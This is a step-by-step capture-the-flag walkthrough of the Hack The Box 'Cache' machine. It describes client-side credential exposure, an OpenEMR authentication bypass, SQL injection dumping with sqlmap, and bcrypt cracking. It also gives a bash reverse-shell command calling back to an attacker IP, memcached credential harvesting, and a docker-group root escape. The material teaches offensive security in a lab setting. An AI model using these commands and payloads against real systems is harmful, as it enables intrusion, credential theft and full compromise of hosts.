# Hack The Box - Cache: Comprehensive Step-by-Step Walkthrough

**Target IP:** `10.129.5.28`  
**Attacker IP:** `10.10.16.84`  
**OS:** Linux  
**Difficulty:** Medium  

---

## Table of Contents
1. [Phase 1: Initial Enumeration](#phase-1-initial-enumeration)
2. [Phase 2: Web Discovery on cache.htb](#phase-2-web-discovery-on-cachehtb)
3. [Phase 3: Virtual Host Discovery (hms.htb)](#phase-3-virtual-host-discovery-hmshtb)
4. [Phase 4: OpenEMR Enumeration & Version Identification](#phase-4-openemr-enumeration--version-identification)
5. [Phase 5: Authentication Bypass & SQL Injection](#phase-5-authentication-bypass--sql-injection)
6. [Phase 6: Credential Extraction & Hash Cracking](#phase-6-credential-extraction--hash-cracking)
7. [Phase 7: Authenticated Remote Code Execution](#phase-7-authenticated-remote-code-execution)
8. [Phase 8: User Flag (www-data → ash)](#phase-8-user-flag-www-data--ash)
9. [Phase 9: Privilege Escalation Enumeration](#phase-9-privilege-escalation-enumeration)
10. [Phase 10: Memcached Credential Harvesting](#phase-10-memcached-credential-harvesting)
11. [Phase 11: Docker Group Privilege Escalation to Root](#phase-11-docker-group-privilege-escalation-to-root)

---

## Phase 1: Initial Enumeration

### Step 1.1: Adding Host Entries

```bash
echo "10.129.5.28 cache.htb hms.htb" | sudo tee -a /etc/hosts
```

**What this does:**  
Appends a line to `/etc/hosts` that maps the target IP to two hostnames: `cache.htb` and `hms.htb`.

**Why we do this:**  
When we access a website by domain name, our system needs to resolve that name to an IP address. Since this is a CTF/lab environment, there is no public DNS server pointing `cache.htb` to the target. Without this entry, our browser would say "server not found." We add `hms.htb` preemptively because we suspect (based on the box name and future enumeration) that virtual hosting might be in play.

> ** Hacker Mindset:** *Always anticipate virtual hosts. Modern web servers often host multiple sites on a single IP using name-based virtual hosting. If you only ever interact with the IP address directly, you might miss entire applications hiding behind different Host headers.*

---

### Step 1.2: Nmap Scan

```bash
nmap -sC -sV -T4 10.129.5.28
```

**What this does:**  
- `-sC`: Runs default NSE scripts (grabs banners, checks for common misconfigurations)  
- `-sV`: Probes open ports to determine service versions  
- `-T4`: Aggressive timing template (faster than default, but not so fast we crash things or get blocked)

**The Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Why this matters:**  
We now know the attack surface is extremely small: only **SSH** and **HTTP**. No weird high ports, no database exposed, no SMB, no FTP. This means our path in is almost certainly through the web application. The SSH version tells us it's Ubuntu 18.04-era, which helps us understand what exploits might work later.

> ** Hacker Mindset:** *When the attack surface is tiny, don't waste time on irrelevant services. Focus 100% on what is exposed. The version numbers are breadcrumbs — write them down. Later, when you have a shell, those same versions might reveal local privilege escalation paths.*

---

## Phase 2: Web Discovery on cache.htb

### Step 2.1: Browse the Main Site

Visit `http://cache.htb` in a browser or use curl:

```bash
curl -s http://cache.htb | head
```

**What we see:**  
A website about hacking with a login button. The landing page doesn't reveal much at first glance.

**Why we look at the source:**  
Client-side code (HTML, JavaScript) is delivered directly to us. The server cannot hide it. Developers often make the mistake of putting sensitive logic, credentials, or API keys in JavaScript files because they forget that users can read every line.

> ** Hacker Mindset:** *Never trust what the rendered page shows you. The source code is the ground truth. Attackers who only click around miss 90% of low-hanging fruit buried in `.js` files, comments, and hidden form fields.*

---

### Step 2.2: Find the JavaScript Credentials

```bash
curl -s http://cache.htb/jquery/functionality.js
```

**What we find:**
```javascript
function checkCorrectPassword(){
    var Password = $("#password").val();
    if(Password != 'H@v3_fun'){
        alert("Password didn't Match");
        error_correctPassword = true;
    }
}
function checkCorrectUsername(){
    var Username = $("#username").val();
    if(Username != "ash"){
        alert("Username didn't Match");
        error_username = true;
    }
}
```

**What this means:**  
The login is performed **entirely in JavaScript** on the client side. The credentials are hardcoded: **`ash:H@v3_fun`**.

**Why this works:**  
There is no server-side validation on the login form (or at least the client-side check is sufficient to proceed). When we enter these credentials, the JavaScript allows the form submission to continue.

> ** Hacker Mindset:** *Client-side authentication is not authentication. It is a suggestion. Whenever you see JavaScript handling credentials, treat it as a gift. Even if there is server-side validation behind it, you've just gained a valid username and a likely password reuse candidate.*

---

### Step 2.3: Logging In and Finding the Author Page

After logging in with `ash:H@v3_fun`, we see an "under construction" page. Not much to work with.

So we explore other pages discovered by directory enumeration or manual browsing:
- `http://cache.htb/author.html`

**What we find:**  
A biography of "ASH" mentioning another project:
> "Check out his other projects like Cache: **HMS (Hospital Management System)**"

**Why this is critical:**  
This tells us there is another application associated with this server. Since we already added `hms.htb` to `/etc/hosts` based on the project name, we can now check if it resolves to the same IP.

> ** Hacker Mindset:** *Read every word on informational pages. "About" pages, author bios, contact pages, and footer text are goldmines for subdomain names, technology stacks, employee names, and project references. One sentence just doubled our attack surface.*

---

## Phase 3: Virtual Host Discovery (hms.htb)

### Step 3.1: Confirming the Virtual Host

Visit `http://hms.htb` in the browser.

**What we see:**  
We are redirected to an OpenEMR login page:
```
http://hms.htb/interface/login/login.php?site=default
```

**What is OpenEMR?**  
OpenEMR is open-source electronic health records and medical practice management software. It is a large, complex PHP application with a long history of vulnerabilities. This is excellent news for an attacker.

> ** Hacker Mindset:** *When you identify a specific software product, your brain should immediately ask three questions: (1) What version is it? (2) What vulnerabilities exist for that version? (3) Do I need authentication, or is there an unauthenticated entry point? The name "OpenEMR" is a huge signal that we should start hunting for known CVEs.*

---

## Phase 4: OpenEMR Enumeration & Version Identification

### Step 4.1: Finding the Version

```bash
curl -s http://hms.htb/admin.php | grep -i "version\|openemr"
```

We also check the login page footer, which mentions **2018**. Cross-referencing with OpenEMR release history, version **5.0.1** was released in April 2018.

**Why the version matters:**  
Once we know the exact software and version, we can search for known exploits. Instead of blindly fuzzing or testing for generic vulnerabilities, we can use targeted, high-confidence attacks.

> ** Hacker Mindset:** *Version fingerprinting is one of the highest-ROI activities in pentesting. Five minutes of Google searching for "OpenEMR 5.0.1 exploit" saves hours of blind SQLi fuzzing. Always fingerprint before you fire.*

---

### Step 4.2: Searching for Exploits

```bash
searchsploit openemr
```

**Key findings:**
- `OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution` (45161.py)
- `OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions` (45202.txt)

**The problem:** Both are **authenticated** exploits. We don't have OpenEMR admin credentials yet.

**The opportunity:**  
Research reveals that OpenEMR 5.0.1 has an **authentication bypass in the patient portal**. The portal is accessible at `/portal/`. If we can bypass auth there, we might reach unauthenticated SQL injection endpoints.

> ** Hacker Mindset:** *When you hit a wall ("authenticated only"), don't give up. Look for side doors. Large applications often have secondary interfaces (patient portals, API endpoints, mobile apps) with weaker security than the main admin panel. The patient portal is exactly that — a less-protected entry point intended for non-admin users.*

---

## Phase 5: Authentication Bypass & SQL Injection

### Step 5.1: Access the Patient Portal

Visit: `http://hms.htb/portal/`

**What we see:**  
A "Patient Portal Login" page with a **Register** button.

**The bypass:**  
Instead of logging in, we simply navigate directly to a page that should require authentication:
```
http://hms.htb/portal/add_edit_event_user.php?eid=1
```

**Why this works:**  
The patient portal has flawed session validation. Simply visiting the registration page sets a session cookie (`PHPSESSID`) that the application treats as authenticated for certain portal endpoints. This is a logic flaw — the developer assumed that anyone with a session cookie must have logged in properly.

> ** Hacker Mindset:** *Always test access control. Click "cancel" on login forms, visit deep links directly, and manipulate session cookies. Applications often check "is there a cookie?" instead of "is this cookie tied to a valid, authorized session?" That difference is your bypass.*

---

### Step 5.2: Confirming SQL Injection

Visit:
```
http://hms.htb/portal/add_edit_event_user.php?eid=1'
```

**What we see:**
```
Query Error
ERROR: query failed: SELECT pc_facility, pc_multiple, pc_aid, facility.name 
FROM openemr_postcalendar_events 
LEFT JOIN facility ON (openemr_postcalendar_events.pc_facility = facility.id) 
WHERE pc_eid = 1'

Error: You have an error in your SQL syntax...
```

**What this tells us:**  
The `eid` parameter is passed **unsanitized** into a SQL query. The single quote we injected broke the query syntax. This is a textbook **error-based SQL injection**.

> ** Hacker Mindset:** *A SQL error page is one of the most beautiful sights in hacking. It is the database literally telling you, "I am executing whatever you give me." The error even reveals the table name (`openemr_postcalendar_events`) and column name (`pc_eid`), which helps us craft better attacks.*

---

### Step 5.3: Setting Up sqlmap

**First, get a valid session cookie:**
```bash
curl -s -c cookies.txt -b cookies.txt "http://hms.htb/portal/account/register.php"
```

**Why we need the cookie:**  
Sqlmap needs to send requests with the same session context our browser has. Without the `PHPSESSID` cookie, the server redirects us to the login page.

**Create the request file:**
```bash
cat > openemr.req << 'EOF'
GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
EOF

echo "Cookie: $(grep -E 'OpenEMR|PHPSESSID' cookies.txt | awk '{print $6"="$7}' | tr '\n' '; ' | sed 's/; $//')" >> openemr.req
```

> ** Hacker Mindset:** *Automation is your friend. Manual SQL injection is an art, but sqlmap is a bulldozer. When you have confirmed a simple injection point, let the tool do the heavy lifting while you plan the next phase. Your time is better spent thinking about privilege escalation than writing `UNION SELECT` queries by hand.*

---

### Step 5.4: Running sqlmap

```bash
sqlmap -r openemr.req -D openemr -T users_secure --dump --batch
```

**What this does:**  
- `-r openemr.req`: Reads the HTTP request from our file  
- `-D openemr`: Targets the `openemr` database  
- `-T users_secure`: Targets the `users_secure` table (known from research to hold admin passwords)  
- `--dump`: Extracts the data  
- `--batch`: Runs without asking interactive questions

**The Output:**
```
Database: openemr
Table: users_secure
[1 entry]
+----+--------------------------------+--------------------------------------------------------------+---------------+
| id | salt                           | password                                                     | username      |
+----+--------------------------------+--------------------------------------------------------------+---------------+
| 1  | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | openemr_admin |
+----+--------------------------------+--------------------------------------------------------------+---------------+
```

**What we now have:**  
The admin username (`openemr_admin`) and a **bcrypt password hash**.

> ** Hacker Mindset:** *Database dumps are treasure troves. Always prioritize tables with names like `users`, `admins`, `accounts`, `credentials`. Password hashes are almost as good as plaintext passwords — given enough time and computing power, they break. Bcrypt is slow, but weak passwords still fall.*

---

## Phase 6: Credential Extraction & Hash Cracking

### Step 6.1: Save and Crack the Hash

```bash
echo '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**What this does:**  
- `john`: John the Ripper, a password cracking tool  
- `--wordlist=/usr/share/wordlists/rockyou.txt`: Uses the famous RockYou leaked password list (14+ million common passwords)  
- The hash format `$2a$05$...` is **bcrypt**, which is intentionally slow to resist cracking. However, weak passwords still fall quickly.

**The Result:**
```
xxxxxx           (?)
```

**Why it cracked so fast:**  
The password `xxxxxx` is extremely short and simple. It is probably in the first few thousand entries of any good wordlist. Even bcrypt's slowness can't protect such a weak password.

> ** Hacker Mindset:** *Always try the easy passwords first. Humans are predictable. "xxxxxx", "password", "123456", and keyboard walks are depressingly common. Before you fire up a GPU cluster for months, let a wordlist run for five minutes. You'll be surprised how often it works.*

**Final OpenEMR credentials:**
- **Username:** `openemr_admin`
- **Password:** `xxxxxx`

---

## Phase 7: Authenticated Remote Code Execution

### Step 7.1: Getting the Exploit

```bash
searchsploit -m php/webapps/45161.py
```

**What this exploit does:**  
It authenticates to OpenEMR as an admin, then abuses a file write vulnerability in the template import feature to write a PHP web shell to the server. Finally, it triggers the shell.

---

### Step 7.2: Fixing Python 3 Compatibility

When we first ran the exploit, it failed with:
```
TypeError: a bytes-like object is required, not 'str'
```

**Why this happens:**  
The exploit was written for Python 2. In Python 3, `base64.b64encode()` requires bytes input, not a string.

**The fix:**
```bash
sed -i 's/base64.b64encode(args.cmd)/base64.b64encode(args.cmd.encode()).decode()/g' 45161.py
```

> ** Hacker Mindset:** *Don't abandon an exploit just because it throws an error. Read the traceback. Nine times out of ten, the bug is a simple Python 2 vs 3 string/bytes issue or a hardcoded URL. Fixing a broken exploit is often faster than writing your own from scratch.*

---

### Step 7.3: Catching the Shell

**Terminal 1 — Start listener:**
```bash
nc -lvnp 9001
```

**Terminal 2 — Run exploit:**
```bash
python 45161.py -u openemr_admin -p xxxxxx -c "bash -i >& /dev/tcp/10.10.16.84/9001 0>&1" http://hms.htb
```

**What the payload does:**  
`bash -i >& /dev/tcp/10.10.16.84/9001 0>&1` is a classic **bash reverse shell one-liner**:
- `bash -i`: Starts an interactive bash shell  
- `>& /dev/tcp/10.10.16.84/9001`: Redirects stdout and stderr to a TCP connection to our machine  
- `0>&1`: Redirects stdin to the same TCP connection

**The Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.5.28] 44898
bash: cannot set terminal process group (1997): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> ** Hacker Mindset:** *Reverse shells are the standard because they bypass outbound firewall rules more easily than bind shells. Most networks allow internal servers to initiate connections to the internet. By having the target call back to us, we punch through any inbound firewall rules. Always have your listener ready before you trigger the exploit — race conditions in CTFs mean someone else might steal your shell if you're slow.*

---

### Step 7.4: Upgrading to a Proper TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Why this matters:**  
A basic netcat shell has no job control, no tab completion, no command history, and breaks when you press Ctrl+C. A proper TTY (terminal) makes everything easier.

> ** Hacker Mindset:** *The first thing you do after getting a shell is stabilize it. Fighting with a broken terminal while trying to privesc is miserable. Spend 10 seconds now to save 10 minutes of frustration later.*

---

## Phase 8: User Flag (www-data → ash)

### Step 8.1: Becoming ash

We already have ash's password from Phase 2: `H@v3_fun`

```bash
su ash
cd ~
cat user.txt
```

**Result:**
```
6f6cd9[redacted]410c14cd
```

**Why this works:**  
Password reuse is rampant. The same password Ash used for his personal blog login (`cache.htb`) also works for his system account. This is extremely common in real environments.

> ** Hacker Mindset:** *Password reuse is the gift that keeps on giving. Always test every credential you find everywhere you can — SSH, SMB, other web apps, database connections. Users are lazy, and they reuse passwords across systems. Your job is to exploit that human behavior.*

---

## Phase 9: Privilege Escalation Enumeration

### Step 9.1: Checking Local Services

```bash
netstat -antp | grep 11211
```

**What we see:**
```
tcp  0  0 127.0.0.1:11211  0.0.0.0:*  LISTEN  -
```

**What is port 11211?**  
This is the default port for **Memcached**, a high-performance, distributed memory caching system. It stores key-value pairs in RAM for fast access.

**Why this matters:**  
The box is literally named **"Cache"**. Finding Memcached running locally is a massive hint that it is part of the privilege escalation chain. Developers often use Memcached to cache session data, user preferences, or even credentials.

> ** Hacker Mindset:** *Always pay attention to the box name. "Cache" + memcached on localhost = intentional design. The creator left you a breadcrumb. Local services that don't require authentication (memcached, redis, elasticsearch) are frequently goldmines because they were never designed to be exposed to attackers.*

---

## Phase 10: Memcached Credential Harvesting

### Step 10.1: Dumping Cached Items

```bash
echo "stats cachedump 1 0" | nc -q 1 127.0.0.1 11211
```

**What this does:**  
Memcached organizes items into "slabs" (memory allocation classes). `stats cachedump 1 0` asks slab #1 to dump all its keys.

**The Output:**
```
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```

**Why we can do this:**  
Memcached has **no authentication by default**. If you can connect to the port, you can read and write everything. It was designed for trusted internal networks, not for multi-user servers.

> ** Hacker Mindset:** *When you find an unauthenticated local service, your first question should be: "What juicy data is it caching?" Memcached and Redis are often used as session stores. If you find session IDs, you might hijack admin web sessions. If you find user data, you might find credentials. Here, the keys are literally named `user` and `passwd` — almost too easy.*

---

### Step 10.2: Retrieving the Credentials

```bash
echo "get user" | nc -q 1 127.0.0.1 11211
echo "get passwd" | nc -q 1 127.0.0.1 11211
echo "get account" | nc -q 1 127.0.0.1 11211
```

**The Output:**
```
VALUE user 0 5
luffy
END

VALUE passwd 0 9
0n3_p1ec3
END

VALUE account 0 9
afhj556uo
END
```

**What we now have:**  
A new set of credentials: **`luffy:0n3_p1ec3`**

> ** Hacker Mindset:** *Credentials found in caches, logs, or config files are often stale or service accounts. Always verify they work. Even if they don't grant you immediate root access, they might be for another user account with different privileges or group memberships. In this case, `luffy` is our next stepping stone.*

---

### Step 10.3: Becoming luffy

```bash
su luffy
id
```

**Output:**
```
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

**The critical observation:**  
`luffy` is a member of the **`docker`** group.

> ** Hacker Mindset:** *The `docker` group is essentially root-equivalent on most systems. Docker containers run with root privileges by default, and members of the docker group can create containers that mount arbitrary host directories. This is one of the most common and dangerous misconfigurations in Linux privilege escalation. When you see `docker`, you should hear "root."*

---

## Phase 11: Docker Group Privilege Escalation to Root

### Step 11.1: Checking Available Images

```bash
docker images
```

**Output:**
```
REPOSITORY  TAG     IMAGE ID      CREATED       SIZE
ubuntu      latest  2ca708c1c9cc  6 years ago   64.2MB
```

**Why we check this:**  
We need a Docker image to spawn a container. The classic GTFOBins payload uses `alpine`, but this box has no internet access to pull new images. Luckily, `ubuntu` is already cached locally.

> ** Hacker Mindset:** *Don't assume the textbook payload will work exactly as written. The classic `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` fails here because there's no alpine image. Always check your environment (`docker images`, `docker ps`) and adapt. Flexibility separates good hackers from script kiddies.*

---

### Step 11.2: The Escape Payload

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
```

**Let's break this down piece by piece:**

| Part | Meaning |
|------|---------|
| `docker run` | Create and start a new container |
| `-v /:/mnt` | **Mount the host's root filesystem (`/`) to `/mnt` inside the container** |
| `--rm` | Automatically delete the container when it exits (cleanup) |
| `-it` | Interactive terminal mode |
| `ubuntu` | Use the locally available Ubuntu image |
| `chroot /mnt sh` | Change root to `/mnt` (which is the host's `/`) and run a shell |

**Why this gives us root:**  
1. Docker containers run as **root** by default  
2. The `-v /:/mnt` flag mounts the **entire host filesystem** into the container  
3. `chroot /mnt` changes the root directory to the mounted host filesystem  
4. We are now running a root shell **inside the host's filesystem**, with full access to everything

**The Result:**
```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
1dae30[redacted]951679d8
```

> ** Hacker Mindset:** *This is the ultimate lesson in trust boundaries. The docker group was intended for developers to manage containers. But Docker's architecture gives the docker group unrestricted root access to the host because container isolation is not a security boundary — it is a convenience feature. Never put untrusted users in the docker group. As an attacker, always check `id`, `groups`, and `docker images` the moment you land on a box. This path is so reliable that it should be in your top 5 privesc checks.*

---

## Final Flags

| Flag | Value |
|------|-------|
| **User** | `6f6cd97[redacted]410c14cd` |
| **Root** | `1dae306[redacted]b951679d8` |

---

## Key Takeaways

1. **Client-side validation is not validation.** Credentials in JavaScript are free wins.
2. **Virtual hosts hide entire applications.** Always check for subdomains and vhosts.
3. **Version fingerprinting saves time.** Knowing the exact software version lets you find targeted exploits immediately.
4. **Side doors matter.** The patient portal had weaker security than the main admin panel.
5. **Sqlmap is your friend.** Don't hand-craft UNION queries when a tool can do it perfectly.
6. **Password reuse is human nature.** Test every credential everywhere.
7. **Local services are soft targets.** Memcached, Redis, and similar services often lack authentication.
8. **The docker group is root.** Always check `groups` output. If you see `docker`, you're probably one command away from root.

---

*Happy Hacking!* 🏴‍☠️
